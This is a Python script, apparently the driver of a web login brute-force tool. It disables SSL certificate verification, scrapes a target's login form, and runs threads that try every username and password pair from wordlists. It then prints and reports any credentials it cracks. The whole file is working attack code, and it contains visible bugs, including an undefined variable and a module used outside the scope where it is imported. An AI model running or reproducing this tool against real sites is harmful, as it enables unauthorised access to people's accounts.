#!/usr/bin/python

# CHECK IMPORTING MODULES
try:
	from core import actions, utils, tbrowser, options
	from plugins import loginbrute
	import sys
except ImportError as ImportError:
	print(ImportError)
	sys.exit("Error while importing modules")


########################## SSL
#	https://stackoverflow.com/a/35960702

########################## End ssl

def main(optionURL, setOptions, optionRunMode, setRunOptions):

	import time, os, threading

	# CHECK IMPORTING ALL LIBS. IMPORT HERE -> CALL HELP_BANNER ONLY FASTER
	try:
		import mechanize, re, ssl, requests
	except ImportError as ImportError:
		print(error)
		_, missing_moudle, _ = str(ImportError).split("'")
		sys.exit("Try: sudo apt install python-%s" %(missing_moudle))
			
	try:
		_create_unverified_https_context = ssl._create_unverified_context
	except AttributeError:
		# Legacy Python that doesn't verify HTTPS certificates by default
		pass
	else:
		# Handle target environment that doesn't support HTTPS verification
		ssl._create_default_https_context = _create_unverified_https_context

	try:
		from Queue import Queue
	except ImportError:
		from queue import Queue
	
	result = Queue()

	def do_job(jobs):
		for job in jobs:
			job.start()
			
		for job in jobs:
			job.join()
	
	# BUG
	"""
		Setting threading with big number
		split jobs for threading
		Memory management
	"""
	
	optionUserlist, optionThreads, optionKeyFalse, optionPasslist = setOptions.values()
	optionProxy, optionReport, optionVerbose = setRunOptions.values()
		
	try:
		optionUserlist = optionUserlist.split("\n")
	except:
		#optionUserlist = optionUserlist.readlines()
		pass

	# TODO Must testing cases with list and file object
	try:
		optionPasslist = optionPasslist.split("\n")
	except:
		pass
	
	
	## End of testing
	
	timeStarting = time.time()

	# get login form info 
	# call brute
		
	sizePasslist = actions.size_o(optionPasslist)
	sizeUserlist = actions.size_o(optionUserlist)

	proc = tbrowser.startBrowser()
	proc.addheaders = [('User-Agent', tbrowser.useragent())]


	try:
		utils.printf("Checking connection...")
		proc.open(optionURL)
		#TODO PROXY
		loginInfo = tbrowser.getLoginForm(optionURL, proc)
		utils.printf("Connection success!", "good")

	except Exception as err:
		utils.die("Error while parsing login form", err)

	finally:
		proc.close()
	
	utils.printf("Starting attack.... %s tasks" %(sizeUserlist * sizePasslist))
	
	workers = []
	trying = 0
	
	try:
		for password in optionPasslist:
			for username in optionUserlist:
				trying += 1
				
				if len(workers) == optionThreads:
					do_job(workers)
					del workers[:]
				if optionRunMode == "--brute":
					worker = threading.Thread(
						target = loginbrute.submit,
						args = (
							optionURL, username.replace("\n", ""), password.replace("\n", ""), sizeUserlist * sizePasslist,
							optionProxy, optionKeyFalse, optionVerbose, loginInfo, result, trying
						)
					)
				worker.daemon = True
				workers.append(worker)
		
		#DO ALL LAST TASKs
		for worker in workers:
			do_job(workers)
			del workers[:]

	except KeyboardInterrupt:# as error:
		# TODO: kill running threads here
		utils.die("Terminated by user!", "KeyboardInterrupt")

	except SystemExit:# as error
		utils.die("Terminated by system!", "SystemExit")

	except Exception as error:
		utils.die("Error while running", error)

	finally:
		runtime = time.time() - timeStarting
		# TODO: clean running threads
		"""
			All threads have been set daemon
			Running threads should be stopped after main task done
		"""
		############################################
		#	Get result
		#
		############################################

		try:
			credentials = list(result.queue)
			if len(credentials) == 0:
				utils.printf("[-] No valid password found!", "bad")
			else:
				utils.printf("\n[*] %s valid password[s] found:\n" %(len(credentials)), "norm")
				utils.print_table(("Username", "Password"), *credentials)

				if optionReport:
					optionProxy = "True" if optionProxy else "False"
					utils.printf(
						utils.report_banner(
							optionURL,
							optionRunMode,
							optionProxy,
							optionThreads,
							credentials,
							"%s_%s" %(time.strftime("%Y.%m.%d_%H.%M"), optionURL.split("/")[2]),
							runtime),
						"good")
				else:
					pass #print with single body with --sqli and --single

		except Exception as err:
			utils.printf("\nError while getting result.\n", "bad")
			utils.printf(err, "bad")

		utils.printf("\nCompleted. Run time: %0.5s [s]\n" %(runtime))

		########################################
		#	Clear resources
		#
		########################################

		try:
			optionPasslist.close()
		except:
			pass
		try:
			optionUserlist.close()
		except:
			pass

		sys.exit(0)

if __name__ == "__main__":
	current_dir = actions.getRootDir(sys.argv[0])
	if current_dir:
		os.chdir(current_dir)
	main(*options.getUserOptions())